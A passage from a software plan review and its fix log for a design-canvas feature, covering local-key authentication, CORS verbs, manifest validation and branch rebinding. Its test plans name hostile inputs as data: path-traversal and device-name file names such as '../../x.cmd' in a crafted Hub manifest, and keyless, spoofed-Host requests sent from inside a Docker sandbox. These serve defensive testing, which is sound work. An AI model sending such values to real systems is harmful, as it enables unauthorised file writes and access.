configuration and all wiring, 3 h), task 24 (renderer, assets, measurement, capture, responder,
hidden renderer, fonts, 3 h) and task 26 (every panel, the token picker, the colour picker, text in
place and the code panel, 3 h) are each about twice their estimate; split 20 as I6 says, 24 into
renderer and capture/responder, 26 into layout, fill/border/effects, and type/tokens/code. The
dependency graph is otherwise right: every depends-on was checked against the contracts each part
consumes, and only task 20 (I6) and task 28's phase-4 dependency (M14) are wrong.

### Security

Strong where it was designed: no script path into any document (three lines, one grep gate), no
message channel to validate, a loopback-only relay that parses nothing, identity from the channel,
no approve tool, no secret in the sandbox beyond the attach token, logs that never hold design text.
Weak where the plan relied on something outside itself: the local caller key (C1), the Hub's
contents (C2), the agent-writable clone (I1) and the export as a second rendering context (I2).
Recorded, not a defect: any process in a sandbox can call the MCP server as its session (I12) —
acceptable, because the scope is the session's own canvas, but the plan should say it.

### Design-system compliance (tasks 24–28)

Each UI part reads `DESIGN-SYSTEM.md` first, uses only tokens that exist in
`desktop/src/styles/tokens.css` (verified), forbids hex colours, gradients in chrome, `transition:
all` and `backdrop-filter` by CSS grep, puts live dots on the one heartbeat, uses `tabular-nums`,
and pairs every state colour with a shape. The flat `--canvas` has no dot grid. Remaining: M20's
toast, counts and scroll anchoring.

### What is missing

Beyond the issues above: a branch-lifecycle seam (I7), a raster-upload path agents can use (I12),
custom fonts (M18), page rename/delete for agents (M19), and a threat-model paragraph in the plan
itself that names the three trust boundaries it crosses — sandbox → control plane, Hub → worktree,
agent → exported file. Everything else the owner, the brief, the spec and the prototype ask for has
a task.

### The two defects a first implementer is most likely to hit

1. **The `PUT` routes blocked by CORS (I3).** Certain to happen on the first real run: the method
   list is hard-coded (`origin.go:169`), no test can see a browser's preflight, and phase 2 hit the
   same class once. **The plan does not prevent it.**
2. **The hidden renderer frozen by a hidden window (I4).** Likely on the first *"minimise the
   cockpit and let agents design"* session: patches wait for animation frames that do not come.
   **The plan does not prevent it**; its jsdom tests cannot show it, and task 01's spike never hides
   the window.

Runner-up: SVG icons without `xmlns` rendering as nothing (I8).

---

## Assessment

The plan is thorough, cites the real tree accurately (the checked citations above hold, with four
drifts), keeps the clean room (no AGPL source named or leaned on anywhere in 31 files), and its core
architecture — a Go authority that is the only writer, a script-less renderer with no message
channel, identity stamped from the relay channel — is sound. Its MCP surface matches the spec tool
for tool. The review-digest vectors are correct.

It is not ready to execute because of the two Critical issues: the human-only approval, the
product's one hard provenance rule, depends on the Hub's local caller key, which the plan calls
optional (C1); and the handoff writes files at paths any Hub teammate can choose (C2). Both are
small to fix — a hard dependency plus negative tests, and a path allowlist plus negative tests —
and neither changes the architecture. Of the Important issues, I1–I3 are security or certain-failure
fixes to make before code; I4–I12 can be fixed in their parts before those tasks start. The Minor
issues are edits.

Fix C1, C2 and I1–I3 in the plan, re-check I6's dependency split, and the plan is ready.

**Plan quality: Needs fixes**

---

## Fix batch b01 (2026-09-24) — C1, C2

Paths are relative to `docs/superpowers/plans/`; `parts/` is `2026-09-23-phase-5-design-canvas-parts/`.
Line numbers are as of this batch's commit.

### C1 — the local caller key is a hard dependency, and every design route requires it

| Change | Where |
|---|---|
| Rule 4 says the key is mandatory, why Host/Origin do not stop a sandbox, and what enforces it | plan `:108-116` |
| G4 gains the invariant: every design route behind the key; no mode, variable or build without it | plan `:270-272` |
| Task table: Hub C3 (Hub plan tasks 37–38) **hard** in the External column of 20, 21, 22, 27 | plan `:415-417`, `:422` |
| The waves: Hub C3 gates Lane E and task 27; no "add the key later" path | plan `:438-441` |
| New ask **HA5-6**: `localkey.Middleware` must refuse a zero `Key` (empty-slice `ConstantTimeCompare` is 1) | plan `:480` |
| Task 20 header: Hub C3 hard | `parts/task-20.md:3` |
| Every route requires the key; none is in `localkey.Exempt`; why | `parts/task-20.md:29-37` |
| The stream's `Authorization` line: required, not "when it has landed" (the review's `:62`) | `parts/task-20.md:69` |
| `Config.KeyGuard` required; `ErrNoKeyGuard`; `New` refuses first; `Mount` wraps every handler | `parts/task-20.md:189-206` |
| `main.go` builds `KeyGuard` from task 37's one minted key | `parts/task-20.md:220-221` (the wiring paragraph) |
| `TestNew_refusesNoKeyGuard`; `TestRoutes_localKeyRequired` (routes 5, 8, 9, 17, 19, 20: no key, wrong key, empty bearer → 401, authority unchanged; no `Origin`, spoofed `Host`); `TestMount_wrapsEveryRoute`; `TestMain_wiring` asserts keyless → 401 | `parts/task-20.md:238-240`, `:243` |
| Acceptance curl now expects `local_key_required`, then `canvas_not_found` with the key | `parts/task-20.md:262-266` |
| Task 21 header: Hub C3 hard | `parts/task-21.md:3` |
| `TestApprove_localKeyRequired` (route 21: 401, **no** `PutBlob`, **no** `Approve`); `TestApprove_noMCPPath` kept (it is the MCP half; the review's `:206`) | `parts/task-21.md:243-244` |
| Task 22 header: Hub C3 hard | `parts/task-22.md:3` |
| `TestHandoff_localKeyRequired` (routes 24 and 25) | `parts/task-22.md:146` |
| Task 27 header: Hub C3 hard | `parts/task-27.md:3` |
| `createDesignClient` requires `localKey` and throws without it; the stream's `localKey` is required with one refresh-and-retry (the review's `:160-161` fallback is gone) | `parts/task-27.md:58-66`, `:77-78` |
| `events.test.ts › authHeader` rewritten; `design.test.ts › localKeyRequired` added | `parts/task-27.md:144-145` |
| "Not claimed" no longer offers a Host/Origin fallback | `parts/task-27.md:170-173` |
| Task 30 header, and step 1's in-sandbox probe: routes 21, 5 and 20 from `docker exec` with no `Origin`, a spoofed `Host`, no key → refused **or** 401 `local_key_required`; the report records whether the host was reachable at all; if it was not, the same requests keyless from the host must be 401 | `parts/task-30.md:3`, `:59-80` |

**Departures from the review's fix, and why.** (1) The review listed routes 5, 8, 9, 17, 19, 20, 21, 24;
this batch adds **25** (the session link writes to the Hub as the signed-in user) and a walk of
every mounted pattern (`TestMount_wrapsEveryRoute`), so a route added later cannot skip the wrap.
(2) `designapi.New` takes a `KeyGuard func(http.Handler) http.Handler`, not the `localkey.Key`:
task 37's `Key` exposes no way to check it is non-zero, so `New` cannot validate a `Key`. The
zero-key gap goes to the Hub as HA5-6. *Corrected in round 2 (re-review I-2):* this batch first
said `TestMain_wiring` kills the identity-function mutant. It cannot: Hub task 37 wraps the whole
guarded mux in `localkey.Middleware` (`task-37.md:70`), so a keyless request through the real
process is 401 whatever `KeyGuard` is. `main.go` now builds the design API only through
`newDesignAPI`, and `TestNewDesignAPI_guardsBareMux` mounts its result on a bare `http.ServeMux`
with no outer wrap; that is the test that kills the mutant.

### C2 — Materialise treats a Hub manifest as hostile input

| Change | Where |
|---|---|
| Task 21 Files: `paths.go`, the one bundle-path rule | `parts/task-21.md:17-18`; plan file map `:336` |
| `MaxSnapshotBytes` = 512 MiB, shared by `BuildSnapshot` and `Materialise` | `parts/task-21.md:67-69` |
| `PathPattern`, `SafePath` (pattern, Windows device names, the `filepath.Rel` check), `ErrUnsafePath`, `ContentTypeFor` | `parts/task-21.md:73-98` |
| Slug rule: cut to 60 bytes **including** the repeat suffix; a device name gets `-artboard` | `parts/task-21.md:142-148` |
| Approve step 5: `MaxSnapshotBytes` → 413; a `SafePath` failure inside `BuildSnapshot` is a bug → 500 | `parts/task-21.md:204-205` |
| `TestBuildSnapshot_limits` (total bytes), `TestBuildSnapshot_pathsSafe`, `TestSafePath` (the review's seven names plus `con.html`, `lpt1.png`, `x.HTML`, `-x.html`, short hex, `manifest.json`, `approval.json`, `""`), `TestSlugs` (device name, over-long repeat) | `parts/task-21.md:232-235` |
| `Materialise`'s six ordered checks: strict manifest decode; the manifest names **this** approval (`designKey`, `canvasId`, `designRevision`, `reviewDigest`, `briefKey`), `BundleDir` from the Hub record only; `SafePath`, no duplicates, artboard paths ⊆ `Files`, content types, asset hex = its SHA-256; 500 files / 16 MiB / 512 MiB **before** any fetch; size and digest per file; the `filepath.Rel` re-check at the write site; any error writes nothing | `parts/task-22.md:48-79` |
| Error mapping: all three errors → `422 handoff_snapshot_invalid`, `details.reason` | `parts/task-22.md:96-100`; code at `parts/task-20.md:137`; `ProblemCode` count at `parts/task-27.md:16-18` |
| The route: `Fetch` bounded by `io.LimitReader(MaxFileBytes+1)`; `rec` is the Hub's record, never the body | `parts/task-22.md:114-117` |
| `TestMaterialise_hostilePaths` (the review's seven names, `con.html` and the Startup-folder path, each with **correct** digests: `ErrUnsafePath`, nothing written anywhere, only the manifest fetched), `TestMaterialise_manifestLies`, `TestMaterialise_otherDesign`, `TestMaterialise_limits`, `TestHandoff_invalidSnapshot` | `parts/task-22.md:141-145` |
| Task 30 step 2: a second `devissuer` user posts a `../../x.cmd` manifest to the real Hub; handoff → 422, nothing written | `parts/task-30.md:84-88` |
| G4 gains the invariant | plan `:272-274` |

**Departures from the review's fix, and why.** (1) The review's regex admits `con.html` (only
`CON.html`, which its case already refuses, was in its test list) — Windows reserves device names
case-insensitively with any extension, so `SafePath` adds a device-name check and `Slugs` never
produces one. (2) It admits `x.tailwind.html` and `x.tailwind.png`, and a slug starting or ending
in `-`, none of which `BuildSnapshot` writes; `PathPattern` is tightened to exactly its output.
(3) `slug.go` said "at most 60 bytes" and then appended `-2`, so a legal repeat could exceed the
regex's 60; the slug rule now cuts the base first. (4) The review said "cap … total bytes" without a
number: this batch takes **512 MiB**, half the Hub's 1 GiB project quota (`hub-contract.md:847`),
and makes `BuildSnapshot` refuse the same number so no snapshot is built that a handoff would
refuse. (5) Errors: the review offered `ErrTampered` or a new `ErrUnsafePath`; this batch uses
`ErrTampered` for digest, size and wrong-design mismatches, `ErrUnsafePath` for paths, and
`ErrTooLarge` for limits, all answered as one 422 code with a `reason`.

**Unverified.** That `host.docker.internal` reaches the host's loopback on this fleet's Docker
Desktop (the review's own caveat) — task 30 step 1 now records it. Hub plan tasks 37–38 are a
sibling plan's; their names (`localkey.Mint`, `Middleware`, `Exempt`, `LocalKeySource`) are cited
from `.claude/worktrees/hub/docs/superpowers/plans/2026-09-23-phase-h-hub-parts/task-37.md:29-77`
and `task-38.md:45-69`, not from built code.

### Round 2 (2026-09-24) — the re-review's open issues (`plan-rereview-b01-1.md`)

The re-review found C1 and C2 resolved and raised I-1, I-2 and M-1 to M-4. Line numbers are as of
this round's commits.

| Finding | Change | Where |
|---|---|---|
| **I-1** slug collision makes an approval un-handoff-able | `Slugs` measures a repeat against every slug already given out (one `taken` set): `"Home"`, `"Home"`, `"Home 2"` → `home`, `home-2`, `home-2-2` | `parts/task-21.md:188-201` |
| I-1 | `CheckManifest(m, manifestSize, ManifestWant)` in `paths.go` is the one manifest rule (kind/v, the approval's keys through `doc.ParseDesignKey`, `SafePath`, no duplicate path or slug, artboard paths ⊆ `Files`, content types, asset hex, the three limits); `ErrTampered` moves to `paths.go` with it | `parts/task-21.md:109-143` |
| I-1 | `BuildSnapshot` runs `CheckManifest` on its own output as its last step; the Files list and the limits comment say so | `parts/task-21.md:17-19`, `:69-84` |
| I-1 | Approve step 5: a self-check `ErrTampered`/`ErrUnsafePath` → `500 internal`, nothing uploaded, no approval; `buildSnapshot` seam | `parts/task-21.md:260-264` |
| I-1 | `TestSlugs` rows (both orders, pairwise distinct); `TestCheckManifest`; `TestBuildSnapshot_selfChecks` (`slugsFn` seam, `:203-205`); `TestApprove_snapshotBug` | `parts/task-21.md:294-297` |
| I-1 | Materialise steps 2–4 are now one `handoff.CheckManifest` call, the same function; `TestMaterialise_sharesCheckManifest` | `parts/task-22.md:52-73`, `:150` |
| I-1 | Plan file map: `paths.go` is the path **and manifest** rule | plan `:336` |
| **I-2** identity `KeyGuard` survives `TestMain_wiring` | `main.go` builds the design API only through `newDesignAPI` (`cmd/api/design.go`); why the outer wrap hides the mutant | `parts/task-20.md:22-23`, `:191`, `:222-233`; plan `:364` |
| I-2 | `TestNewDesignAPI_guardsBareMux`: the result on a bare `http.ServeMux`, no `api.New`, route 5 keyless → 401; `TestMain_wiring`'s kill column narrowed to "never mounted" | `parts/task-20.md:254-255` |
| I-2 | Departure (2) of this section corrected | this file `:519-526` |
| **M-1** stream retry never resets | "a second **consecutive** 401"; the allowance resets on every 200; the test runs two restarts in one window | `parts/task-27.md:77-81`, `:147` |
| **M-2** task 30's probe can hang | `--connect-timeout 3 --max-time 5` on each call; a 15 s `docker exec` context; classified by curl's exit code (6/7/28 with `000` = unreachable; 28 with a status = a keyless stream = fail; 0 = must be 401 `local_key_required`); a keyed host-side positive control on route 20 | `parts/task-30.md:64-100` |
| **M-3** route-walk count rows | task 20 names each part's count; task 21 row (23), task 22 row (26), task 29 row (27) plus route 27's keyless-401 row | `parts/task-20.md:251`; `parts/task-21.md:298`; `parts/task-22.md:151`; `parts/task-29.md:60-61` |
| **M-4.1** design key parse and canvas id | `rec.DesignKey` through `doc.ParseDesignKey` (a parse failure → `ErrTampered`); its canvas id must equal the route's `{canvasId}`, now Materialise's `canvasID` argument; test rows | `parts/task-21.md:124-127`; `parts/task-22.md:62-65`, `:84`, `:119-121`, `:149` |
| **M-4.2** "every path it writes" | now "every `Files` path" (`manifest.json` is not one) | `parts/task-21.md:81-84` |

**Departures, and why.** (1) I-1's fix named `CheckManifest(m Manifest, want ApprovalRecord)`.
`ApprovalRecord` is task 22's type, and `BuildSnapshot` (task 21) has no approval yet, so the
function takes a `ManifestWant` of the four values both callers do have, plus `manifestSize`
(the byte limit counts the manifest, which `Manifest` alone cannot measure). (2) M-2's "28 means
unreachable" is refined: a keyless route 20 sends its headers and then may send no body byte for
up to 15 s (the ping interval), so exit 28 alone cannot tell "unreachable" from "streaming to a
sandbox". The status curl received is the signal, and the positive control proves curl reports it
on a `--max-time` exit. (3) `CheckManifest` also refuses two artboards sharing a slug; unique
paths imply it for `BuildSnapshot`'s output, and it closes a hostile manifest pointing two
artboard rows at one file set.

**Unverified.** That curl prints the received status on a `--max-time` exit (task 30's positive
control checks it). That the sandbox image ships `curl` (already assumed by b01). The re-review's
out-of-scope observations (G4 and review I1's symlink case, the key file under a bind mount, the
HA5-5/HA5-6 row order) are not addressed here.

## Fix batch b02 (2026-09-24) — I3, I6, I7

Paths are relative to `docs/superpowers/plans/`; `parts/` is `2026-09-23-phase-5-design-canvas-parts/`.
Line numbers are as of commit `5d9982d` (commits `17c39eb` I3, `09d8951` I6, `5d9982d` I7).

### I3 — the design routes stay inside the preflight's verb set

| Change | Where |
|---|---|
| Route 11 (`…/assets/{sha}`) and route 17 (`…/selection`) are `POST`, not `PUT` | `parts/task-20.md:88`, `:94` |
| The verb rule: GET, POST, DELETE only; why (`httpx/origin.go:169`, Go contract §3.1 at `2026-09-18-phase-2-go-contract.md:1531`); a later verb amends `corsMethods` and §3.1 in its own commit | `parts/task-20.md:103-113` |
| `TestAssets_putGet` → `TestAssets_postGet` | `parts/task-20.md:273` |
| `TestMount_everyMethodPassesPreflight`: every pattern `Mount` records gets a real preflight through `httpx.NewOriginPolicy(httpx.DefaultOrigins(), …).Middleware`; the method must be in `Allow-Methods`, and `Authorization`, `Content-Type` in `Allow-Headers` | `parts/task-20.md:283` |
| `TestPreflightAllowsEveryRegisteredMethod`: the same over `api.New(d).RegisteredPatterns()`, phase 2's routes included | `parts/task-20.md:284`; Files `:29-30`; plan file map `:365` |
| Task 30 records `corsMethods` **unchanged** as a decision, not an amendment | `parts/task-30.md:46` |
| Owner item 8: image paste and selection in the real webview, no CORS error; count → 8, then 9 after I7 | `parts/task-30.md:132-135`, `:153` |

**Departures, and why.** (1) The review offered POST or a `corsMethods` amendment. This batch
takes POST: route 11 is idempotent by construction (the path is the SHA-256), `origin.go`'s
constant block is already edited by Hub task 37 for `corsHeaders`
(`.claude/worktrees/hub/docs/superpowers/plans/2026-09-23-phase-h-hub-parts/task-37.md:21`, `:64-65`),
and the verb set is the phase-2 Go contract's. (2) The review asked for one `httpx` test. `httpx`
cannot see the routes without importing their packages, so there are two tests, one per route
recorder (`designapi`'s recording `handle`, `api`'s `RegisteredPatterns`,
`control-plane/internal/api/export_test.go:21`). Both send a real preflight and read the live
middleware's answer rather than a copied constant.

### I6 — task 20 is two tasks, each compiling on what it declares

| Change | Where |
|---|---|
| Task 20a (kept as `task-20.md`): header, deps 11, 12, 13, hours 4.5, why the split | `parts/task-20.md:1-11` |
| 20a's Files: no `cmd/api` file; `approvals_none.go` | `parts/task-20.md:22-36` |
| The `Approvals` seam: `(*API).Approvals()` returns `noApprovals{}` (`Latest` → not found) until task 21 replaces it inside `designapi` | `parts/task-20.md:52-59`, `:260`; `TestApprovals_noneUntilTask21` `:289` |
| `Config.Hub` is not in 20a's struct: task 21 adds the field with its type | `parts/task-20.md:233-235` |
| 20a's tests, steps, acceptance and "Not claimed" drop the `cmd/api` work | `parts/task-20.md:291-314` |
| Task 20b (new `task-20b.md`): deps 17, 19, 20a; hours 1.5; the table of calls and the task each comes from | `parts/task-20b.md:1-27` |
| 20b's Files, the two variables, the wiring order (`newDesignAPI` first, then `newMCPServer` / `newMCPDeps`, then `mcprelay.NewSupervisor(mcprelay.SupervisorConfig{…})`) | `parts/task-20b.md:29-68` |
| 20b's tests: `TestConfig_canvasVars`, `TestMain_wiring`, `TestNewDesignAPI_guardsBareMux` (moved from 20), `TestNewMCPServer_wired`, `TestNewMCPDeps_approvalsFromDesignAPI` (new); the acceptance curl (moved) | `parts/task-20b.md:74-78`, `:85-100` |
| Task 21: deps 08, 09, 13, 20a, 20b; Files gain `mount.go` (`Config.Hub`, the real `Approvals()`) and the one `cmd/api/design.go` `Hub` line | `parts/task-21.md:3`, `:22-27` |
| `TestApprove_noHub`: a nil `Hub` → `503 hub_not_configured` (Hub plan `task-32.md:28`), no panic | `parts/task-21.md:310` |
| Plan: task table rows 20a, 20b, 21, 27, 29 | plan `:417-419`, `:425`, `:427` |
| Plan: total ≈ 81 h; critical path `… 15 → 17 → 20b → 21 → 22 → 28 → 30` and why | plan `:430-433` |
| Plan: waves 4 and 5 | plan `:441-442` |
| Plan: Hub C3 names 20a and 20b; lanes; the shared-files list, with 20a/20b and Lane E's two internal hand-offs | plan `:112`, `:444`, `:449-456` |
| Plan: file map rows (`api.go`, `events/`, `designapi/`, `problem.go`, `config.go`/`main.go`, `design.go`, `routes_audit_test.go`); the parts-file note | plan `:359-365`, `:391-392` |
| Every "task 20" restatement names 20a or 20b | `parts/task-10.md:78`, `task-11.md:10`, `:304`, `task-13.md:36`, `:165`, `task-15.md:14`, `:27`, `:245`, `task-19.md:18`, `:114`, `:149`, `:172`, `task-21.md:3`, `:234`, `:304`, `:314`, `task-22.md:107`, `:151`, `:154`, `task-27.md:3`, `:16`, `:29`, `:73`, `task-29.md:3`, `:60-61`, `task-30.md:3`, `:24-25`; plan `:175`, `:269`, `:489` |

**Departures, and why.** (1) The review put a stub `Approvals` in 20b's wiring "until 21". A stub
there would need task 21 to edit `main.go` again. The stub is instead 20a's `(*API).Approvals()`
method, and 20b wires its result, so task 21 changes no MCP wiring. (2) Fixing I6 exposed a second
undeclared dependency of the same kind: `designapi.Config.Hub` had type `Designs`, which task 21
declares (`parts/task-21.md:215-226`), and no task passed a Hub client into `main.go` at all. Task 21
now adds the field and its `design.go` line (so 21 depends on 20b, and the critical path runs
17 → 20b → 21), and passes Hub task 32's `hubclient` value (Hub plan `task-32.md:91-96`).
(3) The old wiring wrote `mcprelay.NewSupervisor{…}`; the real signature is
`NewSupervisor(SupervisorConfig) (*Supervisor, error)` (`parts/task-19.md:86-106`). (4) The plan's
file map said task 19 edits `cmd/api/config.go` and `main.go`; task 19's Files do not
(`parts/task-19.md:13-19`), so the row now says 20b. (5) Hours: the review's sizing note says task 20 was
about twice its 3 h, so 20a is 4 h (4.5 after I7) and 20b is 1.5 h.

### I7 — a canvas binding follows its branch (seam S5-P3.2)

| Change | Where |
|---|---|
| `Binding` comment (why an id does not follow a rename, `project.go:118-121`), `ArchivedAt`; `Bind` counts unarchived bindings only; `Lookup` unarchived only; `Rebind`, `Archive` | `parts/task-10.md:42-76` |
| Crash rule 4 covers `Rebind` and `Archive` | `parts/task-10.md:125-126` |
| `storetest` › *rebind*, › *archive*; `TestFileStore_rebindArchiveRestart` (a crash between temp write and rename leaves the old file) | `parts/task-10.md:133-135` |
| "Not claimed": a delete archives the binding, never the canvas | `parts/task-10.md:164-165`; hours `:3` |
| `authority.Config.Branches BranchLifecycle` (nil before phase 3); `branches.go`: `BranchRename`, `BranchLifecycle{Renames, LastDeleted}`, `ErrBranchLifecycle` (fail closed) | `parts/task-11.md:15-16`, `:33-36`, `:96-125` |
| `resolve`: a fresh lookup (every `Ensure`/`ForBranch`, a session's first call) archives a deleted branch's binding; a miss follows the rename map, bounded against cycles; `CreatedAt = max(now, at + 1 s)` after a delete | `parts/task-11.md:127-149` |
| Scope reads the binding, not `Document.BranchID` (which keeps the creation branch) | `parts/task-11.md:146-149`, `:176-177`; `parts/task-05.md:179` |
| Eight tests: follows a rename, a chain and a cycle, delete archives, a session's first call checks, not-deleted keeps, errors fail closed, nil port, scope follows the binding | `parts/task-11.md:289-296` |
| "Not claimed": a terminal `git branch -m`/`-D` is not followed (phase 3's own A8 limit, phase 3 `task-11.md:198-199`) | `parts/task-11.md:316-320`; hours `:3` |
| The phase-3 adapter `designapi/branches_phase3.go` (only once phase 3 exists): `Renames` over `lanes.Store.Renames` (phase 3 `task-03.md:72-96`); `LastDeleted` over `refs/panacea/archive/<b>/<unix>` (phase 3 `task-11.md:105`, `:111`), the branch id checked before git; a lifecycle error → `500 internal`, no new code | `parts/task-20.md:32-34`, `:38-50` |
| `TestPhase3Branches_renames`, `TestPhase3Branches_lastDeleted`, `TestRoutes_renameAndDelete` | `parts/task-20.md:286-288` |
| 20b wires `authority.Config.Branches`; `newAuthorityConfig`; `TestNewAuthority_branchesWired` | `parts/task-20b.md:35-36`, `:46-50`, `:73` |
| Owner item 9: rename keeps the canvas and approval; delete-and-recreate shows state 1 | `parts/task-30.md:136-140` |
| Plan: P5-L names the seam; the S5-P3.2 row; task rows 10, 11, 20a; file map rows | plan `:216`, `:467`, `:407-408`, `:417`, `:329`, `:361` |

**Departures, and why.** (1) The review put the rebind in `designapi`. MCP resolves a session's
canvas through the authority, not through `designapi`, so a rebind there would leave an agent on a
recreated branch writing into the deleted branch's canvas. `resolve` lives in the authority, behind
both surfaces. (2) The review said "a branch delete archives the binding" without saying how the
canvas learns of a delete. Phase 3's `DeleteBranch` has one hook, and it is phase 4's
(`briefref.Archiver`, phase 3 `task-11.md:114-117`), and a hook can be lost across a crash. This
batch reads phase 3's durable record instead, the archive ref every cockpit delete writes, on every
fresh lookup. No ask to phase 3 is needed. (3) The port returns `LastDeleted` (a time), not a
yes/no, because the archive ref has whole seconds: `resolve` compares at the second and dates a
post-delete binding one second after the delete, so a create and a delete in one second are never
read in the wrong order. (4) Any lifecycle read error fails closed (no create, rebind or archive).
Guessing either way breaks the thread: it hands a new branch the old approvals, or strands the
approved design behind an empty canvas.

**Unverified.** Every phase-3 name (`lanes.Store.Renames`, `Rename`, the archive-ref layout,
`gitx.Machine`, the `branch_has_worktrees` and Q4 refusals) is cited from phase 3's plan parts in
`.claude/worktrees/phase-3/`, not from built code. The same goes for Hub task 32's `hubclient`
wiring and `hub_not_configured`. Whether phase 4's brief binding follows a branch rename (the approval's brief key
after a rename) is phase 4's concern and was not checked. `TestPreflightAllowsEveryRegisteredMethod`
assumes a preflight through `api.New`'s handler reaches the origin middleware at `/`: read from
`httpx/origin.go:231-237` and `routes_audit_test.go:83-88`, not run.

## Fix batch b02, round 2 (2026-09-24) — the re-review's open issues

Source: `.superpowers/sdd/p5/plan-rereview-b02-1.md` (local). Commits `c0c610b` (the I6 half)
and `50bb83a` (the I7 half). **`c0c610b`'s message is wrong:** it reads "phase 5 b01 r2 - a slug
is unique by construction…", a stale message file's text that this batch reused by accident. Its
content is this batch's I6 half only (six files, all listed below). It is recorded here, in
`50bb83a`'s message and in the stream ledger, not amended (the stream forbids amend).
Paths are relative to `docs/superpowers/plans/`; `parts/` is `2026-09-23-phase-5-design-canvas-parts/`.

### RR-I6-1 (Important): 20a named task 15's port types

The reviewer's option 5 ("split `ports.go` out of 15"), folded into task 14 instead of a new task.
`ports.go` is six declarations over `context` alone, so 14 still knows no canvas behaviour. 20a
then depends on 14 (finishes at 5.5 h), and stays off the critical path. **19 is added as well:**
the file map gives `control-plane/go.mod`'s `canvas` requirement to 19 and orders `api.go` "19,
then 20a", and neither was declared (the re-review's carried-over `go.mod` item).

| Change | Where |
|---|---|
| 20a depends on 11, 12, 13, 14, 19, and says why | `parts/task-20.md:3`, `:8-17` |
| "11–13 alone" corrected; 20a imports `canvas/mcp` only for `ports.go` | `parts/task-20.md:9`, `:28-29`, `:247`; `parts/task-20b.md:7` |
| `ports.go` is task 14's (declarations only; text stays in `task-15.md:23-79`) | `parts/task-14.md:17-23`; `parts/task-15.md:18`, `:24`, `:233-234` |
| Plan: row 14, row 20a deps, the file map, Lane E | plan `:411`, `:417`, `:332-333`, `:454` |
| Critical path unchanged; 20a at 20.5 h against 17's 21.5 h | plan `:432-435` |

### RR-I6-2 (Minor): task 21's undeclared Hub C1

| Change | Where |
|---|---|
| Hub C1 (task 32: `api.Deps.Hub`, `CodeHubNotConfigured`) on task 21's External line and the plan row | `parts/task-21.md:3`; plan `:419` |

### RR-I6-3 (Minor): a typed-nil `Hub`

| Change | Where |
|---|---|
| The nil rule: `design.go` assigns `Hub` only from a non-nil `hubclient.Hub` interface; `designapi.New` refuses a typed nil (`ErrTypedNilHub`) | `parts/task-21.md:24`, `:28-37` |
| `TestNew_refusesTypedNilHub`; `TestNewDesignAPI_noHubURL` through the real `newDesignAPI` with `HUB_URL` unset → `503 hub_not_configured` | `parts/task-21.md:320-321` |

### RR-I7-1 (Important): a rename followed only on a miss

| Change | Where |
|---|---|
| A fresh lookup reconciles the **whole project, hit or miss**, under a per-project mutex | `parts/task-11.md:133-142`, steps `:144-177`, nil port `:191` |
| `TestResolve_renameThenRecreateOldFirst` (the reviewer's ordering: old name opened first → state 1; new name → `cv-1`; the new branch's work stays put) | `parts/task-11.md:332` |
| Owner item 9 gains the ordering | `parts/task-30.md:140-142` |

### RR-I7-2 (Important): the delete compared with `CreatedAt`

The reviewer's fix (`BoundAt`, a time-ordered walk, one candidate), plus two things it needs to be
right:
- **`LastDeleted` becomes `Deletes`, every delete.** With only the newest delete, "delete `X`,
  recreate, rename away, recreate, delete again" hides the first delete, and the replay moves a
  deleted branch's canvas.
- **One atomic `Reconcile`, not `Rebind` then `Archive`.** A swap (`x → tmp`, `y → x`, `tmp → y`)
  cannot be applied one row at a time without `ErrExists`.

| Change | Where |
|---|---|
| `Binding.BoundAt` (set by `Bind`, and by a move to the rename row's `At`; an old row reads `CreatedAt`) | `parts/task-10.md:57-62` |
| `Fate`; `Reconcile(projectID, fates)`, checked on the final state, one write; `ErrBadFate`; crash rule 4 | `parts/task-10.md:69-76`, `:86-96`, `:35`, `:146-147` |
| Store tests: *bind sets BoundAt*, *reconcile move*, *reconcile swap and chain*, *reconcile archive*, `TestFileStore_reconcileRestart` | `parts/task-10.md:154-158` |
| Port `Deletes(ctx, projectID) map[string][]time.Time`; fail-closed wording | `parts/task-11.md:111-121`, `:123-125` |
| The replay from `(BranchID, BoundAt)`; the tie rule (a whole-second delete precedes every other event in its second); one owner per branch; the declared same-second residual | `parts/task-11.md:144-177`, residual `:179-186` |
| Tests: `…renameOntoDeletedName` (twice, and the same-second tie), `…deletedIncarnationNotRebound`, `…swapInOneWrite`, the "`from` named twice" case in `…followsRenameChain`, `…outOfCockpitDeleteTieBreak`, and the rewritten `…notDeletedKeeps`, `…sessionFirstCallChecks`, `…lifecycleErrorFailsClosed` | `parts/task-11.md:331-342` |
| The adapter: one fixed `for-each-ref refs/panacea/archive/`, every ref parsed, malformed refs skipped and logged; `TestPhase3Branches_deletes` | `parts/task-20.md:53-59`, `:299` |
| Plan: row 10; the S5-P3.2 seam row, with the open edge | plan `:407`, `:470` |
| Task 11's hours 3.5 → 4 | `parts/task-11.md:3`; plan `:408` |

### RR-I7-3 (Minor): the route test's ordering

| Change | Where |
|---|---|
| `TestRoutes_renameAndDelete` gains (a) old name opened first, (b) renamed onto a deleted name, opened twice | `parts/task-20.md:300` |

### RR-M1 (Minor): the total

| Change | Where |
|---|---|
| "Total 80.5 hours, the sum of the rows": 80 after round 1, plus task 11's 0.5 h in this round. Critical path ≈ 33 h by earliest finish | plan `:430-433` |

### RR-M2 (Minor): `store.NewFile`

| Change | Where |
|---|---|
| `canvasstore.NewFile(canvasDir, log)`, with the alias and the reason (`main.go:78`'s `store`) | `parts/task-20b.md:46-50` |

### Carried over

| Item | Where |
|---|---|
| `go.mod` ordering: 20a now depends on 19 (above) | `parts/task-20.md:3`, `:14-17` |
| 20b's live check: the Docker lock, a built binary, stream port 8781, `PANACEA_APP_REAP_INTERVAL=24h`, its own state dir, killed by PID | `parts/task-20b.md:96-114` |

**Departures, and why.** (1) `ports.go` went into task 14, not a new task: a new task would
renumber the wave and lane text for six type declarations. (2) The tie rule reads a delete as
before any same-second event. The other order fails on the likelier sequence ("delete `X`, then
rename onto `X`") and strands an approved design. The residual (rename, then delete, inside one
second) is declared in `task-11.md`. (3) `designapi.New` refusing a typed nil uses `reflect`, a
small cost for the one field whose nil check guards the approval route.

**Restatement greps run:** `Rebind|LastDeleted|Archive(|rebindArchive|lastDeleted|11.13 alone|≈ 81`
over the plan, every part, `docs/SEAMS.md` and the specs → no hits outside this review's history.
`S5-P3.2|rename map` → every hit read and consistent.

**Unverified.** Phase 3's and the Hub's names are still cited from their plan parts, not from built
code. `git for-each-ref` with a trailing-slash prefix pattern matching every ref under it is from
knowledge of git, not run here. Nothing was built or run: this batch changes documents only.

## Fix batch b03 (2026-09-24) — I1, I5

Paths are relative to `docs/superpowers/plans/`; `parts/` is `2026-09-23-phase-5-design-canvas-parts/`.
